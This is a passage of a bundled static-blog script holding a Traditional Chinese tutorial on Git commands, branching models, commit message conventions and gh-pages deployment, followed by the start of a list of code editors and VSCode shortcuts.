rel=\"nofollow\" href=\"git-scm.com/downloads\">Git Client</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pepese.github.io/blog/mac-dev-environment/\">Mac</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/ryuichi1208/items/45fd2cdd865097a7ad3d\">Git 使うのに便利な CLI ツール</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.gitignore.io/\">gitignore.io - Create Useful .gitignore Files For Your Project</a></li>\n</ul>\n<h3 id=\"vscode-插件\">VSCode 插件</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens\">GitLens</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=donjayamanne.githistory\">Git History</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-pull-request-github\">Github Pull Request</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=codezombiech.gitignore\">gitignore</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=felipecaputo.git-project-manager\">Git Project Manager</a></li>\n</ul>\n<h2 id=\"指令\">指令</h2>\n<h3 id=\"初始\">初始</h3>\n<ol>\n<li><code>git init</code>：建立 local repository，在該工作目錄建立 <code>.git</code> 資料夾，開始使用 Git 做版控</li>\n<li><code>git config</code>：建構 Git 相關設定\n├ <code>--local</code> 參數套用於單獨 project 上時會優於 <code>--global</code>\n├ <code>git config --global user.name &quot;&quot;</code>：設定使用者名稱\n│ <code>git config --global user.email &quot;&quot;</code>：設定使用者帳號\n└<code>git config --global -l</code>：查看目前的設定內容，亦可參照根目錄底下的 <code>.gitconfig</code> 檔</li>\n<li><code>git remote</code>：查看／註冊遠端數據庫 remote repository 的設定\n├ <code>git remote -v</code>：顯示遠端 repo 連結\n├ <code>git remote add [remote_name] [git_url]</code>：新增遠端 repo\n│ ex. <code>git remote add origin http://github.com/f6bfb5/Sample.git</code>\n│ <code>origin</code>、<code>upstream</code> 皆為常見的遠端數據庫名稱別名，亦可更改為其它遠端數據庫名稱\n│ 即 <code>origin/master</code> 就是 Remote Repository 的 master 分支\n├ <code>git remote set-url origin git://new.url.here</code>：修改 remote 位置\n├ <code>git remote remove origin</code>：刪除 remote\n├ <code>git push -u origin master</code>：更新資料至遠端 master 分支\n└ <code>-u</code> 等同於 <code>--set-upstream</code>，意為將此遠端數據庫服務設為追蹤指定的遠端分支</li>\n</ol>\n<h3 id=\"設定\">設定</h3>\n<ol>\n<li><code>git config</code>：建構 Git 相關設定\n├ <code>git config --global http.proxy http://[FQDN]:[PORT]</code>：proxy 設定\n│ <code>git config --global https.proxy http://proxy.example.com:8080</code>\n│ <code>git config --global http.proxy http://[ID]:[Password]@[FQDN]:[PORT]</code>\n│ <code>git config --global https.proxy http://[ID]:[Password]@[FQDN]:[PORT]</code>\n│ <code>git config --global url.&quot;https://&quot;.insteadOf git://</code>\n├ <code>git config --global core.autocrlf false</code>：將 Windows 環境的換行代碼轉換為 CR+LF\n├ <code>git config --global alias.[alias_command] [git_command]</code>：設定指令快捷\n│ ex: <code>git config --global alias.co checkout</code>\n│ co=checkout, br=branch, ci=commit, st=status\n│ 若想執行外部指令，而非 git 底下的指令時，需要在指令的開頭加上 <code>!</code> 字元\n│ ex. <code>git config --global alias.visual &#39;!gitk&#39;</code>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://bardoloi.com/blog/2015/10/29/git-aliases/\">Git productivity with aliasing and multiple commands</a>\n└ <a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/SugarShootingStar/items/64f239f89d25a3b9f520\">[git] gitconfig で会社用アカウントと個人用アカウントを楽に使い分けする</a></li>\n</ol>\n<h3 id=\"提交\">提交</h3>\n<ol>\n<li><code>git add</code>：將 Working Repository 的檔案變更儲存至 Staging Area\n├ <code>git add .</code>：將該目錄及其子目錄下所有異動放入暫存區\n├ <code>git add --all</code>：將整個 Git 版控範圍異動放入暫存區</li>\n<li><code>git commit</code>：將檔案從 Staging Area（暫存區） commit 到 Local Repository（本地儲存庫）\n│ 需要使用 <code>-m</code> 參數記述備註，並會分配一個 commit ID\n│ <code>git commit -m &quot;Commit 說明&quot;</code>\n├ <code>git commit --amend -m &quot;修改後的 Commit 訊息&quot;</code>：修改最後一次 Commit 訊息（實則是撤掉前一次 Commit 重發一次，SHA1 不同）\n├ <code>git commit -am &quot;commit message&quot;</code>：commit 已跟蹤過的文件</li>\n<li><code>git push</code>：將 Local Repository 本地儲存庫的異動 commit 到 Remote Repository 遠端儲存庫\n└ <code>git push origin master</code></li>\n<li><code>git rm [filename] --cached</code>：將檔案轉為 untracked，即 stop tracking</li>\n</ol>\n<h3 id=\"狀態\">狀態</h3>\n<ol>\n<li><code>git status</code>：查看目前的變更狀態\n├ <code>Untracked files:</code> 不存在 Local Repository 和 Staging Area，只存在 Working Directory 裡的檔案\n├ <code>Changes not staged for commit:</code> 之前已存在於 Local Repository 和 Staging Area 裡的檔案\n└ <code>Changes to be commited</code></li>\n<li><code>git diff [file_name]</code>：比較 Staging Area 和 Local Repository 的檔案內容差異\n│ <code>git diff [branch_name] [branch_name]</code>：比較兩者 branch 之間的差異\n└ <code>git diff master origin/master</code></li>\n<li><code>git log</code>：檢視提交歷史紀錄，從上至下由新到舊\n│ <code>git log --all --decorate --oneline --graph</code>：圖形化展示歷史紀錄\n└ <code>git config --global alias.dog log --all --decorate --oneline --graph</code></li>\n<li><code>git reflog</code>：檢視詳細提交紀錄（查看 reset 歷程，找到被拆掉的 commit）</li>\n<li><code>git show [commit_id]</code>：檢視提交紀錄內容</li>\n</ol>\n<h3 id=\"分支\">分支</h3>\n<ol>\n<li><code>git branch</code>：顯示分支一覽，當前分支的前方會有 <code>*</code>\n│ <code>git branch [branch_name]</code>：建立新的分支\n├ <code>git branch -d [branch_name]</code>：刪除本地端的分支\n├ <code>git branch -r</code>：查看遠端 repo 的分支\n├ <code>git branch -a</code>：查看所有分支\n└ <code>git branch [branch_name]/[revision]</code>：切換至指定分支的特定版本</li>\n<li><code>git push origin :[branch_name]</code>：刪除遠端的分支\n└ ※在欲刪除的遠端分支名稱前有個 <code>:</code>、所使用的是 <code>push</code></li>\n<li><code>git checkout [branch_name]</code>：切換至指定的分支\n├ Working Directory 也會變更成指定的分支狀態\n├ <code>git checkout -b [branch_name]</code>：建立新的分支，並切換至該分支\n├ <code>git checkout [branch_name] .</code>：將當前分支的所有檔案複製至指定分支\n└ ※在最後方有一個 <code>.</code></li>\n<li><code>git stash [save [&#39;message]]</code>：暫時儲存目前變更的內容，但不進行 commit\n├ 預設省略 <code>save</code>，亦可加上以註記 <code>stash</code> 的內容為何\n│ 通常用於需跳至其他 branch 時\n├ <code>git stash apply [stash@{n}]</code>\n├ <code>git stash pop [stash@{n}]</code>：復原保存於 <code>stash</code> 的作業內容\n│ 可於參數指定想回復何次的 <code>stash</code>，省略時預設為最新的 <code>stash@{0}</code>\n│ <code>apply</code> 復原後不會取消 <code>stash</code>，<code>pop</code> 復原後會取消 <code>stash</code>\n├ <code>git stash show [stash@{n}]</code>：顯示指定的 <code>stash</code> 內容\n├ <code>git stash list</code>：顯示目前儲存的 <code>stash</code> 一覽\n├ <code>git stash drop [stash@{n}]</code>：刪除指定的 <code>stash</code>\n└ <code>git stash clear</code>：刪除所有 <code>stash</code></li>\n</ol>\n<h3 id=\"合併\">合併</h3>\n<ol>\n<li><code>git clone [git_url]</code>：複製 <code>遠端 repo</code> 至本地端\n├ <code>git clone --mirror</code>\n├ <code>cd C:\\Git\\GitHub</code>\n└ <code>git clone https://github.com/f6bfb5/Sample.git</code>：clone 遠端工作目錄至本地端</li>\n<li><code>git fetch</code>：將 <code>遠端 repo</code> 的最新變更加入至 <code>本地 repo</code></li>\n<li><code>git merge [branch_name]</code>：將 <code>指定分支</code> 的檔案修改合併至 <code>當前分支</code>\n├ 合併兩個分支操作，紀錄兩者之間的實際操作\n├ 預設時使用 <code>fast-forward</code> 方式合併，不會產生新的 commit\n│ <code>git merge [branch] --no-ff</code>：合併時產生新的 commit，用以確保主要分支線圖乾淨\n│ <code>git merge [branch] --squash</code>：合併後僅保留一次 commit 紀錄\n├ <code>git merge [remote_resository]/[branch_name]</code>\n│ 將從 <code>git fetch</code> 取得的 Remote Repository 的變更\n└ 反應至 Local Repository 裡目前的 branch</li>\n<li><code>git rebase [target_branch]</code>\n├ 複製當前分支做的修改，到目標分支的最後一次提交上面\n│ 會將指定分支的歷史紀錄併進 master 的線圖上，用以確保整體分支線圖乾淨\n├ 即把當前 branch 的 HEAD 修改為指定 branch 的（無參數的情況下）最後一個 commit\n└ 由於這個動作過程會再做一次 commit，也會改變目標分支的 commit id，需謹慎使用<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.slideshare.net/WillHuangTW/git-merge-rebase\">git merge 與 rebase 的觀念與實務應用</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/shira-shun/items/29c7f36179117022cb6d\">rebase をちゃんと理解して使えるようになろう！ - Qiita</a></li>\n</ul>\n</li>\n<li><code>git cherry-pick [commit_id]</code>\n└ 任意挑選一個或多個 commit 套用到目前 branch 的最新版本上</li>\n<li><code>git pull</code>\n├ 取得來自 Remote Repository 的變更\n└ 等同 <code>git fetch</code> + <code>git merge origin/master</code></li>\n</ol>\n<h4 id=\"衝突\">衝突</h4>\n<ul>\n<li><code>git mergetool</code>：開啟編輯工具，介面左邊為當前分支，右邊為目標分支，中間為原始檔案</li>\n</ul>\n<h3 id=\"撤銷\">撤銷</h3>\n<ol>\n<li><code>git clean</code></li>\n<li><code>git rm [file_name]</code></li>\n<li><code>git commit --amend -m &quot;commit message&quot;</code>：撤掉前一次 commit 重發一次，SHA1 會不同\n└ <code>git commit --amend --no-edit</code>：沿用原 commit 訊息</li>\n<li><code>git reset [commit_id]</code>：完全撤銷修改至某次 commit\n│ 若省略 <code>[commit_id]</code> 則會自動指定為 <code>HEAD</code>\n├ <code>git reset --hard HEAD^</code>：還原至前個版本\n│ <code>^</code> 代表前一個版本，<code>~5</code> 則代表 5 個之前的版本\n│ <code>--soft</code>：保留暫存區和工作區的檔案\n│ <code>--mixed</code>：捨棄所有暫存區的檔案，但不影響工作區的檔案\n└ <code>--hard</code>：捨棄暫存區和工作區的檔案</li>\n<li><code>git revert [commit_id]</code>：撤銷某次 commit，但保留此次之前和之後的 commit 與紀錄\n└ 並且此次撤銷會作為一次最新的 commit</li>\n</ol>\n<h2 id=\"不想版控的項目\">不想版控的項目</h2>\n<p>建立／編輯 <code>.gitignore</code> 檔案列舉排除不要納入版控的路徑（支援萬用字元 <code>*</code>）</p>\n<pre class=\"language-.gitignore\"><code class=\"language-.gitignore\"># 不加入副檔名為 .exe 的檔案\n*.exe\n# 不加入 .settings 資料夾與其中的檔案\n.settings/\n# 不加入 Bin/bin 資料夾與其中的檔案\n[Bb]in/\n# 不加入特定資料夾裡的特定副檔名檔案\nout/*.log\n\n*.sh</code></pre><p>在修改 .gitignore 前就加入的項目可用 <code>git rm --cached</code> 清除，\n或用 <code>git clean -fx</code> 一口氣清理所有應忽略的檔案</p>\n<h2 id=\"pull-request（pr）\">Pull Request（PR）</h2>\n<ul>\n<li>和 <code>fork</code> 同樣是 Github／Bitbucket 上的整合功能\n├ 不同於 <code>clone</code> 是將 <code>遠端repo</code> 複製至本地端\n├ <code>fork</code> 指的是將 <code>他人的遠端repo</code> 複製至 <code>自己的遠端repo</code>\n└ 以便做出個人版本的內容修改</li>\n<li>指發出請求他人 <code>merge</code> 自己 <code>fork</code> 後做的相關修改內容</li>\n<li>過程為：\n├ 1. <code>fork</code> 專案到自己帳號\n├ 2. <code>clone</code> 到本地修改\n├ 3. <code>push</code> 回自己帳號專案\n├ 4. 發出 PR 給原作者\n└ 5. 原作者收下 PR</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/github/pull-request.html\">與其它開發者的互動 - 使用 Pull Request（PR） - 為你自己學 Git | 高見龍</a></li>\n</ul>\n<h2 id=\"使用-ssh-登入\">使用 SSH 登入</h2>\n<ol>\n<li><code>ssh-keygen -t rsa -C &quot;[email]&quot;</code>／<code>ssh-keygen -t rsa -b 4096 -c &quot;[email]&quot;</code>：產生 SSH key</li>\n<li><code>eval &quot;$(ssh-agent -s)&quot;</code>：在後台開啟 SSH agent</li>\n<li><code>ssh-add -K ~/.ssh/id_rsa</code></li>\n<li><code>cat /Users/[user_name]/.ssh/id_rsa.pub</code>：檢視公鑰</li>\n<li>以 GitHub 為例，至 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/settings/keys\">SSH and GPG keys</a> 點擊 <code>New SSH key</code>，將方才的公鑰貼上</li>\n</ol>\n<h2 id=\"branch-model\">Branch Model</h2>\n<h3 id=\"git-flow\">git-flow</h3>\n<ul>\n<li>由 Driessen 所<a target=\"_blank\" rel=\"nofollow\" href=\"http://keijinsonyaban.blogspot.com/2010/10/a-successful-git-branching-model.html\">發表</a>的一種 git 開發手法，亦或指遵循這套手法所開發的工具</li>\n<li>將專案分為 5 種分支：<code>master</code>、<code>develop</code>、<code>release</code>、<code>feature</code>、<code>hotfix</code></li>\n<li>主要分支：<code>master</code>、<code>develop</code>\n├ <code>master</code> 分支：品質穩定保證可上線的產品主線，多會加上版號 <code>release/1.0</code>\n│ 從 <code>release</code> 分支 merge 而來，不可於此分支直接進行作業或 commit\n├ <code>develop</code> 分支：最新進度的開發主線\n└ 自 <code>master</code> 分支而來，<code>feature</code> 由此分支出去，改好再 merge 進來</li>\n<li>輔助分支：<code>feature</code>、<code>release</code>、<code>hotfix</code>\n├ <code>release</code> 分支：開發進度成熟時，分支到 <code>release</code> 做上線前的最後測試\n│ 測試沒問題後 merge 至 <code>master</code> 及 <code>develop</code>，merge 完畢後會刪除該 <code>release</code> 分支\n├ <code>feature</code> 分支：進行功能追加或修正作業用的分支，自 <code>develop</code> 分支而來，\n│ 通常會將實作功能寫在 <code>feature/</code> 的後方明確化內容，例如 <code>feature/news_feed</code>\n│ 作業完成後再 merge（可再加上 <a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@fcamel/%E4%BD%95%E6%99%82%E8%A9%B2%E7%94%A8-git-merge-no-ff-d765c3a6bef5\"><code>--no-ff</code></a> option 明確化結構）回 <code>develop</code> 分支\n└ <code>Hotfix</code> 分支：緊急修正內容用，從 <code>master</code> 分支出來，改完合併回 <code>master</code> 及 <code>develop</code></li>\n</ul>\n<h4 id=\"相關文章\">相關文章</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md\">Git Workflows and Tutorials</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/kuma%E8%80%81%E5%B8%AB%E7%9A%84%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E6%95%99%E5%AE%A4/%E5%9F%BA%E7%A4%8E-git-flow-%E5%B7%A5%E4%BD%9C%E6%B3%95-fa50b1dddc4f\">Git 怎麼這麼難用？Git Flow + 好習慣 = 不再苦惱</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.hellojcc.tw/2017/12/14/the-flaw-of-git-flow/\">git flow 實戰經驗談 part1 - 別再讓 gitflow 拖累團隊的開發速度</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/ohnaka0410/items/7c7fa20710dfd72b7d7a\">git-flow 図解 - Qiita</a></li>\n</ul>\n<h3 id=\"github-flow\">GitHub Flow</h3>\n<ul>\n<li>簡略化過後的 Branch Model</li>\n<li>將專案分為 2 種分支：<code>master</code>、<code>topic</code></li>\n<li><code>master</code> 分支：品質穩定保證可上線的產品主線，等同於 git-flow 中的 <code>master</code> + <code>develop</code>\n└ 不可於此分支直接進行作業或 commit</li>\n<li><code>topic</code> 分支：進行功能追加或修正作業用的分支，自 <code>master</code> 唯一分支出來的 branch\n├ 等同於 git-flow 中的 <code>feature</code> + <code>hotfix</code>\n└ merge 回 <code>master</code> 後會刪除該 <code>topic</code> 分支</li>\n</ul>\n<h2 id=\"commit-message\">commit message</h2>\n<ul>\n<li>風格：Markup syntax、wrap margins、文法、大寫習慣、符號慣例</li>\n<li>內容：<strong>需要</strong>的資訊</li>\n<li>Metadata：可參照的 issue tracking IDs、pull request 號碼</li>\n</ul>\n<h3 id=\"七條規則\">七條規則</h3>\n<ol>\n<li>用一行空白分隔標題與內容</li>\n<li>限制標題最多只有 50 字元</li>\n<li>標題開頭要大寫</li>\n<li>標題不以句點結尾</li>\n<li>以祈使句撰寫標題</li>\n<li>內文每行最多 72 字</li>\n<li>用內文解釋 what 以及 why vs. how</li>\n</ol>\n<h3 id=\"template\">template</h3>\n<pre class=\"language-\"><code class=\"language-\">Header: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>type</span><span class=\"token punctuation\">></span></span>(<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>scope</span><span class=\"token punctuation\">></span></span>): <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>subject</span><span class=\"token punctuation\">></span></span>\n - type: 代表 commit 的類別：feat, fix, docs, style, refactor, test, chore，必要欄位\n - scope 代表 commit 影響的範圍，例如資料庫、控制層、模板層等等，視專案不同決定，可選欄位\n - subject 代表此 commit 的簡短描述，不要超過 50 個字元，結尾不要加句號，必要欄位\n\nBody: 72-character wrapped. This should answer:\n - Body 部份是對本次 Commit 的詳細描述，可以分成多行，每一行不要超過 72 個字元\n - 說明程式碼變動的項目與原因，還有與先前行為的對比\n\nFooter:\n - 填寫任務編號（如果有的話）.\n - BREAKING CHANGE（可忽略），記錄不兼容的變動，\n   以 BREAKING CHANGE: 開頭，後面是對變動的描述、以及變動原因和遷移方法</code></pre><h4 id=\"type\">type</h4>\n<ul>\n<li>Feat: 新增／修改功能（feature）</li>\n<li>Fix: 修補 bug（bug fix）</li>\n<li>Docs: 文件（documentation）</li>\n<li>Style: 格式（不影響程式碼運行的變動 white-space, formatting, missing semt colons, etc）</li>\n<li>Refactor: 重構（非新增功能，亦不是修補 bug 的程式碼變動）</li>\n<li>Perf: 改善效能（A code change that improves performance）</li>\n<li>Test: 增加測試（Adding missing tests or correcting existing tests）</li>\n<li>chore: 程式建構或輔助工具變動（maintain）</li>\n<li>revert: 撤銷回覆先前的 commit，例如：<code>revert: type(scope): subject (回覆版本:xxxx)</code></li>\n</ul>\n<h3 id=\"工具\">工具</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/commitizen/cz-cli\">commitizen/cz-cli: The commitizen command line utility.</a></li>\n<li><code>yarn global add commitizen</code> or <code>npm install -g commitizen</code></li>\n</ul>\n<h3 id=\"文章\">文章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@kevin940726/write-your-commit-messages-in-the-right-way-65c8e1dfc8a3\">Write your commit messages in the right way - Kai Hao - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.louie.lu/2017/03/21/%E5%A6%82%E4%BD%95%E5%AF%AB%E4%B8%80%E5%80%8B-git-commit-message/\">如何寫一個 Git Commit Message</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wadehuanglearning.blogspot.com/2019/05/commit-commit-commit-why-what-commit.html\">Git Commit Message 這樣寫會更好，替專案引入規範與範例</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.fourdesire.com/2018/07/03/%E6%92%B0%E5%AF%AB%E6%9C%89%E6%95%88%E7%9A%84-git-commit-message/\">撰寫有效的 Git Commit Message</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/tonluqclml/items/bc63c294dda6010b63e9\">レビュー前に直して欲しい日本語の問題点８つ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/itosho/items/9565c6ad2ffc24c09364\">Git のコミットメッセージの書き方</a></li>\n</ul>\n<h2 id=\"推送指定資料夾到-gh-pages-分支\">推送指定資料夾到 gh-pages 分支</h2>\n<ol>\n<li><code>npm i gh-pages --save-dev</code></li>\n<li>編輯 <code>package.json</code>，新增：</li>\n</ol>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  // ...\n  \"scripts\": {\n    \"predeploy\": \"[使用建置服務] build\",\n    \"deploy\": \"gh-pages -d dist\"\n    ...\n  }\n  ...\n}</code></pre><h2 id=\"自動部署-master-branch-到-gh-pages-分支\">自動部署 master branch 到 gh-pages 分支</h2>\n<ol>\n<li>Go to GitHub &gt; Settings &gt; Developer Settings &gt; Personal access tokens &gt; Generate new token</li>\n<li>check <code>repo:status</code> and <code>public_repo</code> &gt; Generate token &gt; Copy it!</li>\n<li>Go to repo &gt; Settings &gt; Secrets &gt; Add a new secret</li>\n<li>Name it something like <code>DEPLOY_PRI</code>, paste token to Value</li>\n<li>Go to Actions &gt; add Actions yml file</li>\n</ol>\n<pre class=\"language-yml\"><code class=\"language-yml\">name: deploy to gh-pages branch\non:\n  push:\n    branches:\n      - master\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    name: Build and deploy to gh-pages\n    env:\n      DEPLOY_PRI: ${{secrets.DEPLOY_PRI}}\n      USER_NAME: USER_NAME\n      USER_EMAIL: USER_EMAIL\n      PUBLISH_DIR: ./dist\n\n    strategy:\n      matrix:\n        node-version: [10.x]\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v1\n      - name: Use Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v1\n        with:\n          node-version: ${{ matrix.node-version }}\n      - name: npm install\n        run: |\n          npm install\n      - name: npm run build\n        run: |\n          npm run build\n      - name: Commit files\n        run: |\n          cd $PUBLISH_DIR\n          git init\n          git config --local user.name $USER_NAME\n          git config --local user.email $USER_EMAIL\n          git status\n          git remote add origin https://$DEPLOY_PRI@github.com/$GITHUB_REPOSITORY.git\n          git checkout -b gh-pages\n          git add --all\n          git commit -m \"deploy to Github pages\"\n          git push origin gh-pages -f\n          echo 🤘 deploy gh-pages complete.</code></pre><h2 id=\"參考文章\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/shimotaroo/items/b73d896ace10894fd290\">Git でやりたいこと、ここで見つかる - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pepese.github.io/blog/git-basics/\">Git 入門</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pepese.github.io/blog/git-commands/\">Git コマンド整理</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://zlargon.gitbooks.io/git-tutorial/content/\">zlargon - Git</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/doggy8088/Learn-Git-in-30-days/tree/master/zh-tw\">30 天精通 Git 版本控管</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.darkthread.net/blog/my-git-cheatsheet/\">我的 Git 指令小抄</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/ashes-note/%E3%84%85-learning-git-2019-cd0a71e061ff\">[筆記]learning-Git-2019</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/gold-kou/items/7f6a3b46e2781b0dd4a0\">いまさらだけど Git を基本から分かりやすくまとめてみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/sky0621/items/8b6e88f4327b42ade5d7\">新人ではないが Git 初心者であるエンジニアが「このリポジトリをフォークしてローカルで開発できるようにしておいて！」と言われた時にやること</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yamamoto7/items/fe15a1e7e360b4015fae\">入門書を終えた人に捧げる、社会人のための Git 中級編 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/west-hiroaki/items/74cccbc22b2cc7a4aacb\">実務でどんな git コマンドを使っているか振り返ってみる</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/muran001/items/dea2bbbaea1260098051\">Git でやらかした時に使える 19 個の奥義</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/github/delete-remote-branch.html\">【狀況題】怎麼刪除遠端的分支？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/using-git/reset-commit.html\">【狀況題】剛才的 Commit 後悔了，想要拆掉重做…</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yukiarrr/items/9c21d97f6c8ac31de157\">git 操作は GUI ツール派な自分も CUI に乗り換えた便利 git 拡張まとめ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Nash-BETA/items/0d4e876cf9460778b985\">GitHub でセキュリティ脆弱性のアラートが来てビビりながら対応した話</a></li>\n</ul>\n","date":"2019-07-18T07:11:59.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"8 min read"};

var route_68 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod54
});

var Mod55 = {"title":"前端筆記 (5) 編輯器與相關資源","slug":"f2e-05-editor-and-extension","html":"<h2 id=\"編輯器\">編輯器</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://atom.io/\">Atom</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://code.visualstudio.com/\">VSCode</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.vim.org/\">Vim</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://brackets.io/\">Brackets</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"線上編輯器\">線上編輯器</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://codesandbox.io/\">CodeSandbox</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://coder.com/projects\">Coder</a></td>\n<td>瀏覽器上的雲端 VSCode</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://stackblitz.com/\">StackBlitz</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/\">Codepen</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://jsbin.com/\">JS Bin</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://plnkr.co/\">Plunker</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://cssdeck.com/\">CSS Deck</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://dabblet.com/\">Dabblet</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://liveweave.com/\">Liveweave</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsfiddle.net/\">JSFiddle</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"vscode\">VSCode</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@sean666/HJ3x8K6Z8\">VS Code 23 個常用快捷鍵速查表</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://poychang.github.io/vscode-shortcuts/\">Visual Studio Code 快速鍵一覽表</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/ea78200036fc80dce0a9\">過去の自分に教えなければならない VSCode のショートカット - Qiita</a></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Ctrl+P</code></td>\n<td>開啟檔案<br>加上 <code>:行數</code> 會再自動跳至指定行數</td>\n</tr>\n<tr>\n<td><code>Ctrl+Shift+E</code></td>\n<td>跳至左側檔案管理處</td>\n</tr>\n<tr>\n<td><code>Ctrl+B</code></td>\n<td>隱藏側邊欄</td>\n</tr>\n<tr>\n<td><code>Ctrl+G</code></td>\n<td>跳至指定行數</td>\n</tr>\n<tr>\n<td><code>Ctrl+Shift+L</code></td>\n<td>反白所有指定文字</td>\n</tr>\n<tr>\n<td><code>Ctrl+Shift+H</code></td>\n<td>跳至搜尋欄</td>\n</tr>\n<tr>\n<td><code>Ctrl+Q</code></td>\n<td>切換終端</td>\n</tr>\n<tr>\n<td><code>Ctrl+L</code></td>\n<td>反白當前行內容</td>\n</tr>\n<tr>\n<td><code>Alt+↑／↓</code></td>\n<td>移動當前行內容</td>\n</tr>\n<tr>\n<td><code>Shift+Alt+↑／↓</code></td>\n<td>快速複製當前行內容</td>\n</tr>\n<tr>\n<td><code>Ctrl+Shift+P</code></td>\n<td>Master Key</td>\n</tr>\n</tbody></table>\n<h2 